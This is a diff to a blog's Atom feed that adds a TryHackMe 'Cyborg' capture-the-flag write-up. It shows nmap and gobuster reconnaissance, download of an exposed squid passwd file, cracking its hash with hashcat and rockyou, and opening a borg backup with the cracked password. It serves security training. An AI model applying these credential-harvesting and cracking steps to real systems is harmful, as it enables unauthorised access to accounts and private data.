@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="https://darrynbrownfield.co.uk/author/darryn/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
-  <updated>2021-01-21T09:06:25+00:00</updated>
+  <updated>2021-01-30T14:06:04+00:00</updated>
   <id>https://darrynbrownfield.co.uk/author/darryn/feed.xml</id>
 
   
@@ -32,8 +32,783 @@
 
   
     <entry>
-      <title type="html">Chocolate Factory CTF Write Up</title>
-      <link href="https://darrynbrownfield.co.uk/chocolatefactory" rel="alternate" type="text/html" title="Chocolate Factory CTF Write Up" />
+      <title type="html">Cyborg Write Up</title>
+      <link href="https://darrynbrownfield.co.uk/cyborg" rel="alternate" type="text/html" title="Cyborg Write Up" />
+      <published>2021-01-30T00:00:00+00:00</published>
+      <updated>2021-01-30T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/cyborg</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/cyborg">&lt;p&gt;&lt;img src=&quot;/assets/images/cyborg/cover.png&quot; alt=&quot;cyborg&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/cyborg&quot;&gt;Cyborg&lt;/a&gt; is a easy room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;I deployed the machine and was given the target IP 10.10.4.85. I started a NMAP scan to check the available ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN nmap/initial 10.10.4.85
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-25 19:42 GMT
+Nmap scan report for 10.10.4.85
+Host is up (0.032s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
+|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
+|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;2 Ports open:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
+  &lt;li&gt;80 - HTTP - Apache web server version 2.4.18&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;The webpage just presents a default apache page so I ran a gobuster.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.4.85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.4.85
+[+] Threads:        50
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/01/25 19:43:12 Starting gobuster
+===============================================================
+/admin (Status: 301)
+/etc (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2021/01/25 19:45:28 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;/etc jumped out as I dont see that to often.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/cyborg/squid.png&quot; alt=&quot;squid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Two files are in /etc/squid, passwd and squid.conf, I downloaded each, looking at passwd shows:&lt;/p&gt;
+
+&lt;p&gt;music_archive:$apr1$B{REDACTED}&lt;/p&gt;
+
+&lt;p&gt;Using hashcat I was able to crack the hash.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;hashcat -m 1600 passwd /usr/share/wordlists/rockyou.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I now turned my attention to /admin which looks like a blog.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;My name is Alex and im a music producer from The United Kingdom! This is my office!!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Clicking around took me to the page /admin/admin.html&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/cyborg/shoutbox.png&quot; alt=&quot;shoutbox&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This line jumped out……. I bet its not! :)&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;my backup “music_archive” is safe&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;There is a ‘Archive’ drop down on the website, clicking that and then download allows me to download a file ‘archieve.tar’.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/cyborg/archive.png&quot; alt=&quot;archive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I extracted the tar file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $tar -xvf archive.tar 
+home/field/dev/final_archive/
+home/field/dev/final_archive/hints.5
+home/field/dev/final_archive/integrity.5
+home/field/dev/final_archive/config
+home/field/dev/final_archive/README
+home/field/dev/final_archive/nonce
+home/field/dev/final_archive/index.5
+home/field/dev/final_archive/data/
+home/field/dev/final_archive/data/0/
+home/field/dev/final_archive/data/0/5
+home/field/dev/final_archive/data/0/3
+home/field/dev/final_archive/data/0/4
+home/field/dev/final_archive/data/0/1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;However, the data looks to be encrypted and I keep seeing a reference to borg. I looked at the README file and saw:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;This is a borg Backup repository.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I Googled borg backup and found a github page.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;BorgBackup (short: Borg) is a deduplicating backup program. Optionally, it supports compression and authenticated encryption.&lt;/p&gt;
+
+  &lt;p&gt;The main goal of Borg is to provide an efficient and secure way to backup data. The data deduplication technique used makes Borg suitable for daily backups since only changes are stored. The authenticated encryption technique makes it suitable for backups to not fully trusted targets.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I downloaded the Borg &lt;a href=&quot;https://github.com/borgbackup/borg/releases&quot;&gt;release&lt;/a&gt; to my machine and made it executable with ‘chmod +x borg-linux64’.&lt;/p&gt;
+
+&lt;p&gt;Reading the documentation, I was able to list archives so I tried that first. It prompted for a password, I entered the cracked password from the passwd file in /etc/squid.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $./borg-linux64 list home/field/dev/final_archive/
+Enter passphrase for key /home/daz/Documents/TryHackMe/Cyborg/home/field/dev/final_archive:
+music_archive                        Tue, 2020-12-29 14:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now I new the name of the archive, I could extract it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $./borg-linux64 extract home/field/dev/final_archive::music_archive
+Enter passphrase for key /home/daz/Documents/TryHackMe/Cyborg/home/field/dev/final_archive:
+drwxr-xr-x alex   alex          0 Tue, 2020-12-29 13:55:52 home/alex
+-rw-r--r-- alex   alex       3637 Mon, 2020-12-28 14:25:14 home/alex/.bashrc
+-rw-r--r-- alex   alex        220 Mon, 2020-12-28 14:25:14 home/alex/.bash_logout
+-rw-r--r-- alex   alex        675 Mon, 2020-12-28 14:25:14 home/alex/.profile
+drwxrwxr-x alex   alex          0 Mon, 2020-12-28 18:00:24 home/alex/Music
+-rw------- alex   alex        439 Mon, 2020-12-28 17:26:45 home/alex/.bash_history
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.dbus
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.dbus/session-bus
+-rw-r--r-- root   root        464 Mon, 2020-12-28 16:33:47 home/alex/.dbus/session-bus/c707f46991feb1ed17e415e15fe9cdae-0
+drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config
+drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/ActionScript
+-rw-r--r-- root   root       7046 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/ActionScript/ActionScript.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/AppleScript
+-rw-r--r-- root   root       8934 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/AppleScript/AppleScript.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/ASP
+-rw-r--r-- root   root       7254 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/ASP/ASP.sublime-syntax.cache
+-rw-r--r-- root   root        640 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/ASP/HTML-ASP.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Batch File
+-rw-r--r-- root   root       4850 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Batch File/Batch File.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/C#
+-rw-r--r-- root   root        604 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/C#/Build.sublime-syntax.cache
+-rw-r--r-- root   root      17237 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/C#/C#.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/C++
+-rw-r--r-- root   root      11817 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/C++/C.sublime-syntax.cache
+-rw-r--r-- root   root      15283 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/C++/C++.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Clojure
+-rw-r--r-- root   root       2814 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Clojure/Clojure.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/CSS
+-rw-r--r-- root   root      17947 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/CSS/CSS.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/D
+-rw-r--r-- root   root      18692 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/D/D.sublime-syntax.cache
+-rw-r--r-- root   root        287 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/D/DMD Output.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Diff
+-rw-r--r-- root   root        806 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Diff/Diff.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Erlang
+-rw-r--r-- root   root       5881 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Erlang/Erlang.sublime-syntax.cache
+-rw-r--r-- root   root        257 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Erlang/HTML (Erlang).sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats
+-rw-r--r-- root   root       1607 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Attributes.sublime-syntax.cache
+-rw-r--r-- root   root       3096 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Commit.sublime-syntax.cache
+-rw-r--r-- root   root       1314 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Common.sublime-syntax.cache
+-rw-r--r-- root   root       1911 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Config.sublime-syntax.cache
+-rw-r--r-- root   root        328 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Ignore.sublime-syntax.cache
+-rw-r--r-- root   root        742 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Link.sublime-syntax.cache
+-rw-r--r-- root   root        473 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Log.sublime-syntax.cache
+-rw-r--r-- root   root       1342 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Rebase.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Go
+-rw-r--r-- root   root       7366 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Go/Go.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Graphviz
+-rw-r--r-- root   root       1506 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Graphviz/DOT.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Groovy
+-rw-r--r-- root   root       5574 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Groovy/Groovy.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Haskell
+-rw-r--r-- root   root       2859 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Haskell/Haskell.sublime-syntax.cache
+-rw-r--r-- root   root        588 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Haskell/Literate Haskell.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/HTML
+-rw-r--r-- root   root       5979 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/HTML/HTML.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Java
+-rw-r--r-- root   root       9275 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Java/Java.sublime-syntax.cache
+-rw-r--r-- root   root        909 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Java/Java Server Pages (JSP).sublime-syntax.cache
+-rw-r--r-- root   root       1661 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Java/JavaDoc.sublime-syntax.cache
+-rw-r--r-- root   root        575 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Java/JavaProperties.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/JavaScript
+-rw-r--r-- root   root      16252 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/JavaScript/JavaScript.sublime-syntax.cache
+-rw-r--r-- root   root       1561 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/JavaScript/JSON.sublime-syntax.cache
+-rw-r--r-- root   root       1294 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/JavaScript/Regular Expressions (JavaScript).sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/LaTeX
+-rw-r--r-- root   root       1079 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/LaTeX/Bibtex.sublime-syntax.cache
+-rw-r--r-- root   root      10203 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/LaTeX/LaTeX.sublime-syntax.cache
+-rw-r--r-- root   root        668 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/LaTeX/LaTeX Log.sublime-syntax.cache
+-rw-r--r-- root   root       1788 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/LaTeX/TeX.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Lisp
+-rw-r--r-- root   root       5115 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Lisp/Lisp.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Lua
+-rw-r--r-- root   root       5353 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Lua/Lua.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Makefile
+-rw-r--r-- root   root        234 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Makefile/Make Output.sublime-syntax.cache
+-rw-r--r-- root   root       4762 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Makefile/Makefile.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Markdown
+-rw-r--r-- root   root      11172 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Markdown/Markdown.sublime-syntax.cache
+-rw-r--r-- root   root        393 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Markdown/MultiMarkdown.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Matlab
+-rw-r--r-- root   root      26157 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Matlab/Matlab.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Objective-C
+-rw-r--r-- root   root      25087 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Objective-C/Objective-C.sublime-syntax.cache
+-rw-r--r-- root   root      15819 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Objective-C/Objective-C++.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/OCaml
+-rw-r--r-- root   root        430 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/OCaml/camlp4.sublime-syntax.cache
+-rw-r--r-- root   root       6237 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/OCaml/OCaml.sublime-syntax.cache
+-rw-r--r-- root   root       1659 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/OCaml/OCamllex.sublime-syntax.cache
+-rw-r--r-- root   root       1623 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/OCaml/OCamlyacc.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Pascal
+-rw-r--r-- root   root       1171 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Pascal/Pascal.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Perl
+-rw-r--r-- root   root       8858 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/Perl/Perl.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/PHP
+-rw-r--r-- root   root        447 Mon, 2020-12-28 16:33:47 home/alex/.config/sublime-text-3/Cache/PHP/PHP.sublime-syntax.cache
+-rw-r--r-- root   root      32165 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/PHP/PHP Source.sublime-syntax.cache
+-rw-r--r-- root   root       1248 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/PHP/Regular Expressions (PHP).sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Python
+-rw-r--r-- root   root      17292 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Python/Python.sublime-syntax.cache
+-rw-r--r-- root   root       1130 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Python/Regular Expressions (Python).sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/R
+-rw-r--r-- root   root      14814 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/R/R.sublime-syntax.cache
+-rw-r--r-- root   root        219 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/R/R Console.sublime-syntax.cache
+-rw-r--r-- root   root       1177 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/R/Rd (R Documentation).sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rails
+-rw-r--r-- root   root        427 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rails/HTML (Rails).sublime-syntax.cache
+-rw-r--r-- root   root        388 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rails/JavaScript (Rails).sublime-syntax.cache
+-rw-r--r-- root   root        985 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rails/Ruby Haml.sublime-syntax.cache
+-rw-r--r-- root   root       1486 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rails/Ruby on Rails.sublime-syntax.cache
+-rw-r--r-- root   root        304 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rails/SQL (Rails).sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Regular Expressions
+-rw-r--r-- root   root       2985 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Regular Expressions/RegExp.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/RestructuredText
+-rw-r--r-- root   root       1611 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/RestructuredText/reStructuredText.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Ruby
+-rw-r--r-- root   root       9901 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Ruby/Ruby.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rust
+-rw-r--r-- root   root        228 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rust/Cargo.sublime-syntax.cache
+-rw-r--r-- root   root       8561 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Rust/Rust.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Scala
+-rw-r--r-- root   root      13481 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Scala/Scala.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/ShellScript
+-rw-r--r-- root   root      10255 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/ShellScript/Bash.sublime-syntax.cache
+-rw-r--r-- root   root       7668 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/ShellScript/commands-builtin-shell-bash.sublime-syntax.cache
+-rw-r--r-- root   root        158 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/ShellScript/Shell-Unix-Generic.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/SQL
+-rw-r--r-- root   root       2724 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/SQL/SQL.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/TCL
+-rw-r--r-- root   root       1010 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/TCL/HTML (Tcl).sublime-syntax.cache
+-rw-r--r-- root   root       4120 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/TCL/Tcl.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Cache/Text
+-rw-r--r-- root   root         92 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Cache/Text/Plain text.tmLanguage.cache
+-rw-r--r-- root   root         43 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Cache/Text/Plain text.tmLanguage.rcache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Textile
+-rw-r--r-- root   root       1783 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Textile/Textile.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/XML
+-rw-r--r-- root   root       2344 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/XML/XML.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/YAML
+-rw-r--r-- root   root       3850 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/YAML/YAML.sublime-syntax.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Default
+-rw-r--r-- root   root       4086 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Default/Syntax Summary.cache
+-rw-r--r-- root   root      10895 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Default/Meta Info Summary.cache
+-rw-r--r-- root   root    1003914 Mon, 2020-12-28 16:33:48 home/alex/.config/sublime-text-3/Cache/Default/Startup.cache
+drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Packages
+drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Packages/User
+drwx------ root   root          0 Mon, 2020-12-28 16:38:24 home/alex/.config/sublime-text-3/Local
+-rw-r--r-- root   root       5199 Mon, 2020-12-28 16:38:24 home/alex/.config/sublime-text-3/Local/Auto Save Session.sublime_session
+drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Lib
+drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Lib/python3.3
+drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/sublime-text-3/Installed Packages
+drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/ibus
+drwx------ root   root          0 Mon, 2020-12-28 16:33:49 home/alex/.config/ibus/bus
+drwxrwxr-x alex   alex          0 Tue, 2020-12-29 13:55:52 home/alex/Documents
+-rw-r--r-- root   root        110 Tue, 2020-12-29 13:55:41 home/alex/Documents/note.txt
+drwxrwxr-x alex   alex          0 Mon, 2020-12-28 17:59:30 home/alex/Public
+drwxrwxr-x alex   alex          0 Mon, 2020-12-28 17:59:37 home/alex/Videos
+drwxrwxr-x alex   alex          0 Tue, 2020-12-29 13:57:14 home/alex/Desktop
+-rw-r--r-- root   root         71 Tue, 2020-12-29 13:57:14 home/alex/Desktop/secret.txt
+drwxrwxr-x alex   alex          0 Mon, 2020-12-28 17:59:57 home/alex/Downloads
+drwxrwxr-x alex   alex          0 Mon, 2020-12-28 18:00:02 home/alex/Templates
+drwxrwxr-x alex   alex          0 Mon, 2020-12-28 18:26:44 home/alex/Pictures
+&lt;/code&gt;&lt;/pre&gt;
+
